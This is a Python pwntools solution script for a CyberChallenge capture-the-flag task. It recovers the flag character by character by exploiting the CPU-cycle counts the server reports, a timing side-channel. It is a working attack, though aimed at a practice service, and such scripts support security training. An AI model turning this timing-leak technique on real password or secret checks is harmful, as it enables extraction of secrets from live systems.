from pwn import *
from string import printable

def main():
    r = remote("benchmark.challs.cyberchallenge.it", 9031)
    r.recvuntil(b":")
    dict = {}

    for _ in printable:
        r.sendline(_)
        ans = r.recvuntil(b"cycles").decode().split()
        c = int(ans[4])
        dict[_] = c
        r.recvuntil(b":")
        if _ == '~':
            break
    
    flag = "CCIT{"
    fcc = 1231
    x = 1200
    r.sendline(flag)
    ans = r.recvuntil(b"cycles").decode().split()
    r.recvuntil(b":")

    while True:
        for _ in printable:
            temp = flag + str(_)
            fcctemp = fcc + dict[_]
            r.sendline(temp)
            ans = r.recvuntil(b"cycles").decode().split()
            tempcount = int(ans[4])
            if tempcount - fcctemp == x:
                flag = temp
                print(flag)
                fcc = fcctemp
                x += 300
                break
            r.recvuntil(b":")


        r.recvuntil(b":")
        
    r.close()


if __name__ == "__main__":
    main()
